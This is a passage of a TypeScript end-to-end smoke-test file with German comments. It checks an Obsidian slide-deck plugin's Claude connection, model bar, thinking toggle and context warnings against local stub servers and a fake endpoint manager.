async function startZaehler(): Promise<{ url: string; pfade: () => string[]; close: () => Promise<void> }> {
  const pfade: string[] = [];
  const server: Server = createServer((req: IncomingMessage, res: ServerResponse) => {
    pfade.push(req.url ?? "");
    res.writeHead(200, { "content-type": "image/svg+xml" });
    res.end("<svg xmlns='http://www.w3.org/2000/svg' width='1' height='1'/>");
  });
  await new Promise<void>((ok) => server.listen(0, "127.0.0.1", ok));
  const port = (server.address() as AddressInfo).port;
  return { url: `http://127.0.0.1:${port}`, pfade: () => [...pfade], close: () => new Promise<void>((ok) => server.close(() => ok())) };
}

/** CL1–CL3 — Claude (Anthropic API) ueber den LLM Endpoint Manager (Kit 0.62.0, Opt-in `transports.anthropic` in `deckConnectionOptions`).
 *  Gegenstelle: der zentrale LLM-Stub im Anthropic-Modus (Messages-API: Pfad, `x-api-key`, `anthropic-version`, Pflichtfelder geprueft); kein
 *  Aufruf an api.anthropic.com. Wie V4–V13 laeuft `startDeckGeneration` ohne DOM des Erzeugen-Panels; der Denkblock im Panel (Abschnitt
 *  `chat`, `stromMessen`) ist auf `llmEndpoints` und einen OpenAI-Stub verdrahtet und ignoriert den Fake-Manager — gemessen wird deshalb
 *  der Zustand `reasoning`, aus dem das Panel den Block baut, nicht der Block selbst. Der Fake-Manager liefert den Endpunkt nur, wenn der
 *  Aufrufer `anthropic` unter den Transporten verlangt (Kontrolle in CL1). */
async function pruefeClaudeVerbindung(cdp: Cdp): Promise<void> {
  const [CL1, CL2, CL3] = ABSCHNITT_PUNKTE.verbindung!.filter((n) => n.startsWith("CL"));
  const MODELL = "claude-haiku-5-5";
  const SCHLUESSEL = "sk-ant-smoke-slide-deck";
  const DECK = "---\ntheme: kami\n---\n# Claude-Deck\n\nErste Folie.\n\n---\n\n# Zweite Folie\n\n- Punkt";
  const ZIEL_OK = "smoke-claude-cl2.md";
  const ZIEL_FEHLER = "smoke-claude-cl3.md";
  let fehlerModus = false;
  let manager = false;
  const stub = await startLlmStub({
    anbieter: "anthropic",
    schluessel: SCHLUESSEL,
    models: [{ id: MODELL, capabilities: { effort: { supported: true }, thinking: { types: { adaptive: { supported: true } } } } }],
    takt: 20,
    antwort: () => (fehlerModus ? { status: 529, fehler: "Overloaded", model: MODELL } : { reasoning: "Ich plane zuerst die Folien. ", text: DECK, laenge: 24, model: MODELL }),
  });
  const vorherChoice = await cdp.evaluate<string>(`return JSON.stringify(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.choice ?? {});`);
  try {
    await installFakeManager(cdp, {
      endpunkte: [{
        id: "fake-claude", label: "Claude API", url: stub.url, models: [MODELL], defaultModel: MODELL, configModel: "default",
        provider: "anthropic", backend: "anthropic", apiKey: SCHLUESSEL, hasSecret: true, transport: "anthropic",
      }],
      invalidiere: [PLUGIN_ID],
    });
    manager = true;
    const sicht = await cdp.evaluate<{ ohne: number; mit: number; quelle: string; modell: string; familie: string | null; backend: string }>(`
      const api = app.plugins.plugins["llm-endpoint-manager"].api;
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.choice = {};
      p.llm.invalidate();
      await p.llm.resolve({ force: true });
      const src = p.llm.source();
      return {
        ohne: api.list({ capability: "chat" }).length,
        mit: api.list({ capability: "chat", transports: ["http", "anthropic"] }).length,
        quelle: src.backendSource, modell: src.model, familie: src.family, backend: src.backend,
      };
    `);
    record(CL1!,
      sicht.ohne === 0 && sicht.mit === 1 && sicht.quelle === "manager" && sicht.modell === MODELL && sicht.backend === "anthropic" && sicht.familie === "claude",
      `Kontrolle am Fake: list() ohne transports ${sicht.ohne}, mit ["http","anthropic"] ${sicht.mit}; Plugin: Backend ${sicht.backend} (Quelle ${sicht.quelle}), Familie ${String(sicht.familie)}, Modell ${sicht.modell}`);

    const laufe = (ziel: string): Promise<{ status: string; error: string | null; phase: string; denken: string }> => cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      let denken = "";
      const h = p.startDeckGeneration({ sourceBody: "# Probe\\n\\nEin Satz.", slideTarget: 3, hint: "", themeKey: p.settings.defaultTheme,
        model: ${JSON.stringify(MODELL)}, targetPath: ${JSON.stringify(ziel)}, replace: true, sourceLink: "[[smoke]]" });
      h.subscribe((s) => { if (s.reasoning && s.reasoning.length > denken.length) denken = s.reasoning; });
      const r = await h.done;
      return { status: r.status, error: r.error ?? null, phase: h.snapshot().phase, denken };
    `);

    // CL2 — ein Lauf
    erzeugtePfade.push(ZIEL_OK);
    stub.loescheMitschnitt();
    const ok = await laufe(ZIEL_OK);
    const notiz = await cdp.evaluate<string>(`const f = app.vault.getAbstractFileByPath(${JSON.stringify(ZIEL_OK)}); return f ? await app.vault.read(f) : "";`);
    const budget = await cdp.evaluate<number>(`return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.llmMaxTokens;`);
    const anfragen = stub.anfragen().filter((a) => a.route === "messages");
    const letzte = anfragen.at(-1);
    const body = (letzte?.json ?? {}) as Record<string, unknown>;
    const kopf = letzte?.header ?? {};
    const verbotene = ["temperature", "top_p", "top_k", "min_p", "presence_penalty"].filter((k) => k in body);
    const drahtOk = anfragen.length > 0 && body.model === MODELL && kopf["x-api-key"] === SCHLUESSEL && typeof kopf["anthropic-version"] === "string"
      && kopf["anthropic-dangerous-direct-browser-access"] === "true" && body.max_tokens === budget && body.stream === true && verbotene.length === 0
      && stub.anfragen().every((a) => a.route !== "chat");
    record(CL2!,
      drahtOk && ok.status === "ok" && notiz.includes("# Claude-Deck") && ok.denken.includes("Ich plane zuerst"),
      `Status ${ok.status}, Notiz ${notiz.includes("# Claude-Deck") ? "mit Deck" : "OHNE Deck"}, Denken im Zustand ${JSON.stringify(ok.denken.slice(0, 30))}; Anfragen ${anfragen.length}, x-api-key ${kopf["x-api-key"] === SCHLUESSEL ? "ok" : "FALSCH"}, anthropic-version ${String(kopf["anthropic-version"])}, Browser-Header ${String(kopf["anthropic-dangerous-direct-browser-access"])}, max_tokens ${String(body.max_tokens)} (Budget ${String(budget)}), stream ${String(body.stream)}, verbotene Felder: ${verbotene.length === 0 ? "keine" : verbotene.join(",")}`);

    // CL3 — die API antwortet 529
    fehlerModus = true;
    erzeugtePfade.push(ZIEL_FEHLER);
    const fehler = await laufe(ZIEL_FEHLER);
    const da = await cdp.evaluate<boolean>(`return Boolean(app.vault.getAbstractFileByPath(${JSON.stringify(ZIEL_FEHLER)}));`);
    record(CL3!,
      fehler.status === "fatal" && fehler.phase === "error" && /529|overload/i.test(fehler.error ?? "") && !da,
      `Status ${fehler.status}, Phase ${fehler.phase}, Fehler ${JSON.stringify((fehler.error ?? "").slice(0, 90))}, Notiz ${da ? "GESCHRIEBEN" : "nicht geschrieben"}`);
  } catch (e) {
    const schon = new Set(bilanz.eintraege().map((x) => x.name));
    for (const n of [CL1, CL2, CL3]) if (n !== undefined && !schon.has(n)) bilanz.unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (manager) await entferneFakeManager(cdp, { invalidiere: [PLUGIN_ID] }).catch(() => undefined);
    await cdp.evaluate(`const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]; p.settings.choice = ${vorherChoice}; p.llm.invalidate(); return true;`).catch(() => undefined);
    await stub.stop();
  }
}

/** DT1 — misst die Zeile „Denk-Test“ im Tab in vier Lagen: lokaler Endpunkt (da), Wechsel auf Claude im GEOEFFNETEN Tab (weg:
 *  die Kit-Verbindung zeichnet nur ihren eigenen Behaelter neu, die Zeile folgt ihr ueber `onResolved`), Claude beim Oeffnen
 *  (weg), Manager entfernt (wieder da). Stub und Fake-Manager wie CL1–CL3 (Anthropic-Modus). */
async function pruefeDenkTestClaude(cdp: Cdp, ctx: Ctx): Promise<void> {
  const MODELL = "claude-haiku-5-5";
  const SCHLUESSEL = "sk-ant-smoke-slide-deck-dt1";
  const stub = await startLlmStub({
    anbieter: "anthropic",
    schluessel: SCHLUESSEL,
    models: [{ id: MODELL, capabilities: { effort: { supported: true }, thinking: { types: { adaptive: { supported: true } } } } }],
    takt: 20,
    antwort: () => ({ text: "ok", laenge: 2, model: MODELL }),
  });
  const vorherChoice = await cdp.evaluate<string>(`return JSON.stringify(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.choice ?? {});`);
  const hatZeile = (namen: string[]): boolean => namen.some((n) => /^(Thinking test|Denk-Test)$/.test(n));
  const lies = (offen: OffenerTab): Promise<string[]> => offen.ziel.evaluate<string[]>(`
    const wurzel = document.querySelector(".vertical-tab-content-container .vertical-tab-content") ?? document.querySelector(".vertical-tab-content");
    return wurzel ? [...wurzel.querySelectorAll(".setting-item-name")].map((n) => (n.textContent ?? "").trim()) : [];
  `);
  const installiere = (): Promise<unknown> => installFakeManager(cdp, {
    endpunkte: [{
      id: "fake-claude", label: "Claude API", url: stub.url, models: [MODELL], defaultModel: MODELL, configModel: "default",
      provider: "anthropic", backend: "anthropic", apiKey: SCHLUESSEL, hasSecret: true, transport: "anthropic",
    }],
    invalidiere: [PLUGIN_ID],
  });
  const erg = { lokal: false, live: true, beimOeffnen: true, zurueck: false, familie: "" };
  try {
    await cdp.evaluate(`const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]; p.settings.choice = {}; p.llm.invalidate(); await p.llm.resolve({ force: true }); return true;`);
    const offen = await oeffneTab(cdp, ctx);
    try {
      erg.lokal = hatZeile(await lies(offen));
      await installiere();
      // Die Aufloesung stoesst im echten Ablauf die Endpunkt-Zeile an (`setChoice` → `invalidate`, der Behaelter zeichnet sich neu und loest auf);
      // der Treiber aendert den Manager von aussen, also loest er selbst auf. Offen bleibt allein: folgt die Zeile dieser Aufloesung?
      erg.familie = await cdp.evaluate<string>(`const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]; await p.llm.resolve({ force: true }); return String(p.llm.source().family);`);
      // Wechsel im offenen Tab: die Zeile muss ohne erneutes Oeffnen verschwinden (bis 3 s warten).
      for (let i = 0; i < 12; i++) {
        await new Promise((r) => setTimeout(r, 250));
        erg.live = hatZeile(await lies(offen));
        if (!erg.live) break;
      }
    } finally {
      await schliesseTab(cdp, offen);
    }
    const neu = await oeffneTab(cdp, ctx);
    try { erg.beimOeffnen = hatZeile(await lies(neu)); } finally { await schliesseTab(cdp, neu); }
    await entferneFakeManager(cdp, { invalidiere: [PLUGIN_ID] });
    const ohne = await oeffneTab(cdp, ctx);
    try { erg.zurueck = hatZeile(await lies(ohne)); } finally { await schliesseTab(cdp, ohne); }
    record(DT1_NAME,
      erg.lokal && erg.familie === "claude" && !erg.live && !erg.beimOeffnen && erg.zurueck,
      `lokal: Zeile ${erg.lokal ? "da" : "FEHLT"} · nach Wechsel auf Claude im offenen Tab (Familie ${erg.familie}): ${erg.live ? "Zeile STEHT NOCH" : "weg"} · Tab neu geoeffnet mit Claude: ${erg.beimOeffnen ? "Zeile DA" : "weg"} · Manager entfernt: Zeile ${erg.zurueck ? "wieder da" : "FEHLT"}`);
  } catch (e) {
    if (!bilanz.eintraege().some((x) => x.name === DT1_NAME)) bilanz.unmeasured(DT1_NAME, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    await entferneFakeManager(cdp, { invalidiere: [PLUGIN_ID] }).catch(() => undefined);
    await cdp.evaluate(`const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]; p.settings.choice = ${vorherChoice}; p.llm.invalidate(); return true;`).catch(() => undefined);
    await stub.stop();
  }
}

/** MZ1–MZ6 — die Modellzeile (`buildModelBar`) im Erzeugen-Fenster. Stub mit zwei Modellen (verschiedene Kontextgrenzen ueber
 *  `GET /api/v0/models`), Endpunkt als lokale Zeile; MZ3 zusaetzlich gegen den Claude-Stub mit Fake-Manager. Das Panel loest nur beim
 *  Oeffnen und bei `onShow` auf: jede Messung oeffnet es frisch (`oeffneErzeugenPanel` schliesst das Hub-Blatt zuerst). */
async function pruefeModellzeile(cdp: Cdp, ctx: Ctx): Promise<void> {
  const KLEIN = "mz-klein";
  const GROSS = "mz-gross";
  const GRENZE_KLEIN = 2000;
  const ZIEL = "smoke-stream-quelle — Deck.md";
  const DECK = "---\ntheme: kami\n---\n# Modellzeile\n\nErste Folie.\n\n---\n\n# Zweite Folie\n\n- Punkt";
  const LANG = `# Wandern\n\n${"Eine Tagestour braucht Wasser, feste Schuhe und eine Karte. ".repeat(200)}`;
  const namen = [MZ1_NAME, MZ2_NAME, MZ3_NAME, MZ4_NAME, MZ5_NAME, MZ6_NAME];
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  const SEL = ".sd-gen-view .okit-model-bar .okit-model-bar-select";
  const kontextAntwort = (): ZusatzAntwort => ({
    json: { data: [
      { id: KLEIN, loaded_context_length: GRENZE_KLEIN, max_context_length: GRENZE_KLEIN },
      { id: GROSS, loaded_context_length: 100000, max_context_length: 100000 },
    ] },
  });
  const stub = await startLlmStub({
    models: [KLEIN, GROSS], takt: 10, laenge: 40,
    antwort: () => ({ text: DECK, model: GROSS }),
    zusatz: { "GET /api/v0/models": kontextAntwort },
  });
  const vorherEndpoints = await cdp.evaluate<string>(`return JSON.stringify(${P}.settings.llmEndpoints);`);
  const vorherChoice = await cdp.evaluate<string>(`return JSON.stringify(${P}.settings.choice ?? {});`);
  const vorherRequest = await cdp.evaluate<string>(`return JSON.stringify(${P}.settings.request);`);
  erzeugtePfade.push(STREAM_QUELLE, ZIEL);
  const waehle = (wert: string): Promise<unknown> => cdp.evaluate(`
    const sel = document.querySelector(${JSON.stringify(SEL)});
    if (!sel) return false;
    sel.value = ${JSON.stringify(wert)};
    sel.dispatchEvent(new Event("change", { bubbles: true }));
    return true;
  `);
  const hinweise = (): Promise<string> => cdp.evaluate<string>(`return [...document.querySelectorAll(".sd-gen-view .sd-gen-hint")].map((e) => e.textContent ?? "").join(" | ");`);
  let manager = false;
  try {
    // ---- MZ1 + MZ2: lokaler Endpunkt, Wechsel, Lauf
    const grund = await oeffneErzeugenPanel(cdp, stub, { modell: KLEIN });
    if (grund !== null) throw new Error(grund);
    const zeile = await pollUntil<string>(cdp, `
      const sel = document.querySelector(${JSON.stringify(SEL)});
      if (!sel) return null;
      const werte = [...sel.options].map((o) => o.value);
      return werte.includes(${JSON.stringify(GROSS)}) ? JSON.stringify({ werte, texte: [...sel.options].map((o) => o.textContent), aktiv: sel.value }) : null;
    `, 10_000, 200);
    const z = zeile === null ? null : (JSON.parse(zeile) as { werte: string[]; texte: string[]; aktiv: string });
    if (z === null) {
      const d = "Die Modellzeile (.okit-model-bar-select) mit den Modellen des Stubs kam in 10 s nicht ins Erzeugen-Fenster";
      record(MZ1_NAME, false, d);
      record(MZ2_NAME, false, d);
    } else {
      const oeffneTabText = async (wert: string): Promise<boolean> => {
        const t = await oeffneTab(cdp, ctx);
        try { return await t.ziel.evaluate<boolean>(`return [...document.querySelectorAll(".okit-model-slot input, .okit-model-slot select")].some((i) => i.value === ${JSON.stringify(wert)});`); } finally { await schliesseTab(cdp, t); }
      };
      const altTab = await oeffneTabText(KLEIN);
      await waehle(GROSS);
      const nach = await pollUntil<string>(cdp, `
        const p = ${P};
        return p.llm.modelInUse() === ${JSON.stringify(GROSS)} && p.settings.llmEndpoints[0]?.model === ${JSON.stringify(GROSS)}
          ? JSON.stringify({ verbindung: p.llm.modelInUse(), zeile: p.settings.llmEndpoints[0].model, bar: document.querySelector(${JSON.stringify(SEL)})?.value }) : null;
      `, 8_000, 200);
      const tabNeu = nach === null ? false : await oeffneTabText(GROSS);
      record(MZ1_NAME,
        z.werte.includes(KLEIN) && z.werte.includes(GROSS) && z.aktiv === KLEIN && altTab && nach !== null && tabNeu,
        `Optionen ${JSON.stringify(z.texte)}, Start ${z.aktiv}; Tab vorher ${altTab ? "zeigt " + KLEIN : "ZEIGT " + KLEIN + " NICHT"}; nach dem Wechsel: ${nach ?? "Verbindung/Einstellung NICHT umgestellt"}; Tab danach ${tabNeu ? "zeigt " + GROSS : "ZEIGT " + GROSS + " NICHT"}`);

      // Sichtpruefung (Regel 12): die Zeile hell und dunkel, im breiten und im schmalen (280 px) Panel. Nur mit SMOKE_SHOT_DIR.
      const shotDir = process.env.SMOKE_SHOT_DIR;
      if (shotDir) {
        mkdirSync(shotDir, { recursive: true });
        const war = await cdp.evaluate<boolean>(`return document.body.classList.contains("theme-dark");`);
        for (const breite of [640, 280]) {
          await cdp.evaluate(`const r = app.workspace.rightSplit; if (r && typeof r.setSize === "function") r.setSize(${breite}); return true;`);
          await new Promise((r) => setTimeout(r, 500));
          for (const dunkel of [false, true]) {
            await cdp.evaluate(`document.body.classList.toggle("theme-dark", ${dunkel}); document.body.classList.toggle("theme-light", ${!dunkel}); return true;`);
            await new Promise((r) => setTimeout(r, 300));
            const box = await boxOf(cdp, ".sd-gen-view", 8);
            if (box) writeFileSync(join(shotDir, `mz-${dunkel ? "dunkel" : "hell"}-${breite}.png`), await capture(cdp, box, 2));
          }
        }
        await cdp.evaluate(`document.body.classList.toggle("theme-dark", ${war}); document.body.classList.toggle("theme-light", ${!war}); const r = app.workspace.rightSplit; if (r && typeof r.setSize === "function") r.setSize(640); return true;`);
      }

      // MZ2 — ein Lauf mit dem gewaehlten Modell
      stub.loescheMitschnitt();
      await cdp.evaluate(`document.querySelector(".sd-gen-view .sd-gen-cta button.mod-cta").click(); return true;`);
      const fertig = await pollUntil<string>(cdp, `
        const f = app.vault.getAbstractFileByPath(${JSON.stringify(ZIEL)});
        return f ? await app.vault.read(f) : null;
      `, 20_000, 300);
      const body = (stub.letzte("chat")?.json ?? {}) as { model?: string };
      record(MZ2_NAME,
        fertig !== null && body.model === GROSS && /^model:\s*mz-gross\s*$/m.test(fertig),
        `Anfrage-Body model ${String(body.model)}; Notiz ${fertig === null ? "NICHT geschrieben" : (/^model:.*$/m.exec(fertig)?.[0] ?? "ohne model:-Zeile")}`);
    }

    // ---- MZ3 lokal: der Denk-Knopf
    // Ausgangslage herstellen: ein frueherer Abschnitt (R4) laesst eine Stufe zurueck; der Knopf soll von „an“ aus schalten.
    await cdp.evaluate(`${P}.settings.request.thinking = { ...(${P}.settings.request.thinking ?? {}), creative: "medium" }; return true;`);
    const g3 = await oeffneErzeugenPanel(cdp, stub, { modell: GROSS });
    if (g3 !== null) throw new Error(g3);
    // Ohne gespeicherte Stufe gilt der Standard des Modus creative (Kit-Tabelle): medium.
    const stufe = (): Promise<string> => cdp.evaluate<string>(`return String(${P}.settings.request.thinking?.creative ?? "medium");`);
    const KNOPF = ".sd-gen-view .okit-model-bar .okit-thinking-toggle";
    const knopfDa = await pollUntil<boolean>(cdp, `return document.querySelector(${JSON.stringify(KNOPF)}) ? true : null;`, 8_000, 200);
    if (!knopfDa) record(MZ3_NAME, false, "Der Denk-Knopf (.okit-thinking-toggle) steht nicht in der Modellzeile des Erzeugen-Fensters");
    else {
    const s0 = await stufe();
    const druecke = async (): Promise<{ stufe: string; pressed: string | null }> => {
      await cdp.evaluate(`document.querySelector(${JSON.stringify(KNOPF)}).click(); return true;`);
      await new Promise((r) => setTimeout(r, 400));
      return { stufe: await stufe(), pressed: await cdp.evaluate<string | null>(`return document.querySelector(${JSON.stringify(KNOPF)})?.getAttribute("aria-pressed") ?? null;`) };
    };
    const s1 = await druecke();
    const s2 = await druecke();

    // ---- MZ3 Claude: „aus nicht moeglich“ mit Hinweis
    const SCHLUESSEL = "sk-ant-smoke-slide-deck-mz3";
    const MODELL = "claude-haiku-5-5";
    const claude = await startLlmStub({
      anbieter: "anthropic", schluessel: SCHLUESSEL,
      models: [{ id: MODELL, capabilities: { effort: { supported: true }, thinking: { types: { adaptive: { supported: true } } } } }],
      takt: 20, antwort: () => ({ text: "ok", laenge: 2, model: MODELL }),
    });
    let claudeText = { label: "", aria: "" };
    try {
      await installFakeManager(cdp, {
        endpunkte: [{ id: "fake-claude", label: "Claude API", url: claude.url, models: [MODELL], defaultModel: MODELL, configModel: "default",
          provider: "anthropic", backend: "anthropic", apiKey: SCHLUESSEL, hasSecret: true, transport: "anthropic" }],
        invalidiere: [PLUGIN_ID],
      });
      manager = true;
      await cdp.evaluate(`${P}.settings.choice = {}; ${P}.settings.request.thinking = { ...(${P}.settings.request.thinking ?? {}), creative: "off" }; return true;`);
      const g3c = await oeffneErzeugenPanel(cdp, claude);
      if (g3c !== null) throw new Error(g3c);
      claudeText = await pollUntil<string>(cdp, `
        const b = document.querySelector(${JSON.stringify(KNOPF)});
        const l = b ? (b.textContent ?? "").trim() : "";
        return b && /lowest level|niedrigste Stufe/.test(l) ? JSON.stringify({ label: l, aria: b.getAttribute("aria-label") ?? "" }) : null;
      `, 10_000, 250).then((r) => (r === null ? { label: "", aria: "" } : (JSON.parse(r) as { label: string; aria: string })));
    } finally {
      if (manager) { await entferneFakeManager(cdp, { invalidiere: [PLUGIN_ID] }).catch(() => undefined); manager = false; }
      await claude.stop();
    }
    record(MZ3_NAME,
      s0 === "medium" && s1.stufe === "off" && s1.pressed === "false" && s2.stufe === s0 && s2.pressed === "true"
        && claudeText.label !== "" && /can't be fully turned off|nicht ganz abschalten/.test(claudeText.aria),
      `lokal: ${s0} → ${s1.stufe} (aria-pressed ${String(s1.pressed)}) → ${s2.stufe} (aria-pressed ${String(s2.pressed)}); Claude: Knopf ${JSON.stringify(claudeText.label)} mit aria-label ${JSON.stringify(claudeText.aria.slice(0, 80))}`);
    }

    // ---- MZ4: Kontext-Warnung folgt dem Modell
    await cdp.evaluate(`${P}.settings.request = ${vorherRequest}; ${P}.settings.choice = {}; return true;`);
    const g4 = await oeffneErzeugenPanel(cdp, stub, { modell: KLEIN, text: LANG });
    if (g4 !== null) throw new Error(g4);
    const warnKlein = await pollUntil<string>(cdp, `
      const t = [...document.querySelectorAll(".sd-gen-view .sd-gen-hint")].map((e) => e.textContent ?? "").join(" | ");
      return t.includes(${JSON.stringify(String(GRENZE_KLEIN))}) ? t : null;
    `, 10_000, 250);
    // Die Kontext-Anfragen (LM Studio `/api/v0/models`) vor und nach dem Wechsel: die Neuberechnung ist die zweite am Draht.
    const kontextAnfragen = (): number => stub.anfragen().filter((a) => a.pfad === "/api/v0/models").length;
    // Erst warten, bis die Pruefungen des Aufbaus durch sind (Anzahl 1,5 s unveraendert): eine noch laufende liest das Modell erst nach
    // dem Wechsel und raeumte die Warnung auch ohne Neuberechnung.
    for (let still = 0, zuletzt = -1; still < 6; ) {
      await new Promise((r) => setTimeout(r, 250));
      const jetzt = kontextAnfragen();
      still = jetzt === zuletzt ? still + 1 : 0;
      zuletzt = jetzt;
    }
    const vorWechsel = kontextAnfragen();
    await waehle(GROSS);
    let warnGross = await hinweise();
    for (let i = 0; i < 16 && warnGross.includes(String(GRENZE_KLEIN)); i++) { await new Promise((r) => setTimeout(r, 250)); warnGross = await hinweise(); }
    record(MZ4_NAME,
      warnKlein !== null && !warnGross.includes(String(GRENZE_KLEIN)) && kontextAnfragen() > vorWechsel,
      `mit ${KLEIN}: ${warnKlein === null ? "KEINE Warnung mit Grenze " + GRENZE_KLEIN : JSON.stringify(warnKlein.trim())}; nach dem Wechsel auf ${GROSS}: ${warnGross.includes(String(GRENZE_KLEIN)) ? "Warnung STEHT NOCH " + JSON.stringify(warnGross.trim()) : "weg"}; Kontext-Anfragen am Draht vorher ${vorWechsel}, danach ${kontextAnfragen()}`);

    // ---- MZ5: Endpunkt ohne Modell-Liste
    stub.konfiguriere({ models: [] });
    await cdp.evaluate(`${P}.settings.choice = {}; return true;`);
    const g5 = await oeffneErzeugenPanel(cdp, stub, { modell: KLEIN });
    if (g5 !== null) throw new Error(g5);
    const keine = await pollUntil<string>(cdp, `
      const sel = document.querySelector(${JSON.stringify(SEL)});
      const warn = document.querySelector(".sd-gen-view .okit-model-bar-warn");
      const knopf = document.querySelector(".sd-gen-view .sd-gen-cta button.mod-cta");
      if (!sel || !warn || warn.classList.contains("is-hidden")) return null;
      return JSON.stringify({ texte: [...sel.options].map((o) => o.textContent), hinweis: warn.getAttribute("aria-label") ?? "", knopfAus: !!knopf?.disabled });
    `, 10_000, 250);
    const k = keine === null ? null : (JSON.parse(keine) as { texte: string[]; hinweis: string; knopfAus: boolean });
    record(MZ5_NAME,
      k !== null && /^(Automatisch|Automatic)/.test(k.texte[0] ?? "") && k.hinweis !== "" && !k.knopfAus,
      k === null ? "Die Zeile mit dem Listen-Hinweis kam in 10 s nicht" : `Optionen ${JSON.stringify(k.texte)}, Hinweis ${JSON.stringify(k.hinweis)}, Knopf ${k.knopfAus ? "GESPERRT" : "bedienbar"}`);
    stub.konfiguriere({ models: [KLEIN, GROSS] });

    // ---- MZ6: Sperre, wenn anderswo ein Lauf aktiv ist
    await cdp.evaluate(`${P}.settings.choice = {}; return true;`);
    const g6 = await oeffneErzeugenPanel(cdp, stub, { modell: KLEIN });
    if (g6 !== null) throw new Error(g6);
    await pollUntil<boolean>(cdp, `return document.querySelector(${JSON.stringify(SEL)}) ? true : null;`, 8_000, 200);
    const wechsle = async (aktiv: boolean): Promise<{ select: boolean; refresh: boolean } | null> => {
      await cdp.evaluate(`${P}.activeGeneration = ${aktiv ? "{ sentinel: true }" : "null"}; return true;`);
      // Das Panel zeichnet die Sperre bei `onShow` neu: Tab wechseln und zurueck.
      await cdp.evaluate(`
        const tabs = [...document.querySelectorAll(".okit-hub-tab")];
        const andere = tabs.find((b) => b.getAttribute("data-tab") !== "generate");
        const eigene = tabs.find((b) => b.getAttribute("data-tab") === "generate");
        andere?.click(); await new Promise((r) => setTimeout(r, 300)); eigene?.click();
        return true;
      `);
      const r = await pollUntil<string>(cdp, `
        const sel = document.querySelector(${JSON.stringify(SEL)});
        const rf = document.querySelector(".sd-gen-view .okit-model-bar-refresh");
        return sel && rf && sel.disabled === ${aktiv ? "true" : "false"} ? JSON.stringify({ select: sel.disabled, refresh: rf.disabled }) : null;
      `, 6_000, 200);
      return r === null ? null : (JSON.parse(r) as { select: boolean; refresh: boolean });
    };
    let gesperrt: { select: boolean; refresh: boolean } | null;
    let frei: { select: boolean; refresh: boolean } | null;
    try {
      gesperrt = await wechsle(true);
    } finally {
      frei = await wechsle(false);
    }
    record(MZ6_NAME,
      gesperrt !== null && gesperrt.select && gesperrt.refresh && frei !== null && !frei.select && !frei.refresh,
      `mit aktivem Lauf: Dropdown ${gesperrt === null ? "NICHT gesperrt" : "gesperrt"}, Neu laden ${gesperrt?.refresh ? "gesperrt" : "NICHT gesperrt"}; ohne Lauf: ${frei === null ? "bleibt gesperrt" : "bedienbar"}`);
  } catch (e) {
    const schon = new Set(bilanz.eintraege().map((x) => x.name));
    for (const n of namen) if (!schon.has(n)) bilanz.unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    await cdp.evaluate(`${P}.activeGeneration = null; return true;`).catch(() => undefined);
    if (manager) await entferneFakeManager(cdp, { invalidiere: [PLUGIN_ID] }).catch(() => undefined);
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llmEndpoints = ${vorherEndpoints}; p.settings.choice = ${vorherChoice}; p.settings.request = ${vorherRequest};
      p.llm.invalidate();
      app.workspace.detachLeavesOfType("slide-deck-hub");
      return true;
    `).catch(() => undefined);
    await stub.stop();
  }
}

/** CX1 — die Kontext-Warnung des Erzeugen-Fensters gegen Claude (Fake-Manager, Anthropic-Stub). Die Grenze steht in `max_input_tokens` der
 *  Modell-Liste (`GET /v1/models?limit=1000`, `x-api-key` statt Bearer). Eine Notiz von 32.800 Zeichen liegt ueber der Heuristik
 *  (`limit == null && body.length > 30000`): mit bekannter Grenze 200000 darf nichts warnen, mit 4000 muss die Warnung die Grenze nennen. */
async function pruefeKontextClaude(cdp: Cdp): Promise<void> {
  const MODELL = "claude-haiku-5-5";
  const SCHLUESSEL = "sk-ant-smoke-slide-deck-cx1";
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  const LANG = `# Wandern\n\n${"Eine Tagestour braucht Wasser, feste Schuhe und eine Karte. ".repeat(540)}`.slice(0, 32800);
  const eintrag = (grenze: number | null): ModellEintrag => ({
    id: MODELL, max_input_tokens: grenze, max_tokens: 64000,
    capabilities: { effort: { supported: true }, thinking: { types: { adaptive: { supported: true } } } },
  });
  const stub = await startLlmStub({
    anbieter: "anthropic", schluessel: SCHLUESSEL, models: [eintrag(200000)], takt: 20, antwort: () => ({ text: "ok", laenge: 2, model: MODELL }),
  });
  const vorherChoice = await cdp.evaluate<string>(`return JSON.stringify(${P}.settings.choice ?? {});`);
  const vorherEndpoints = await cdp.evaluate<string>(`return JSON.stringify(${P}.settings.llmEndpoints);`);
  let manager = false;
  erzeugtePfade.push(STREAM_QUELLE, "smoke-stream-quelle — Deck.md");
  const lauf = async (grenze: number): Promise<{ warnung: string; anfrage: { pfad: string; key: unknown; version: unknown } | null }> => {
    stub.konfiguriere({ models: [eintrag(grenze)] });
    stub.loescheMitschnitt();
    await cdp.evaluate(`${P}.settings.choice = {}; return true;`);
    const grund = await oeffneErzeugenPanel(cdp, stub, { text: LANG });
    if (grund !== null) throw new Error(grund);
    // Die Pruefung der Quelle laeuft nach dem Aufbau; warten, bis die Kontext-Anfrage am Draht war und die Anzeige sich beruhigt hat.
    for (let still = 0, zuletzt = -1; still < 6; ) {
      await new Promise((r) => setTimeout(r, 250));
      const jetzt = stub.anfragen().filter((a) => a.route === "models").length;
      still = jetzt === zuletzt ? still + 1 : 0;
      zuletzt = jetzt;
    }
    const warnung = await cdp.evaluate<string>(`return [...document.querySelectorAll(".sd-gen-view .sd-gen-hint")].map((e) => e.textContent ?? "").join(" | ").trim();`);
    const ctxAnfrage = stub.anfragen().filter((a) => a.route === "models" && a.url.includes("limit=1000")).at(-1);
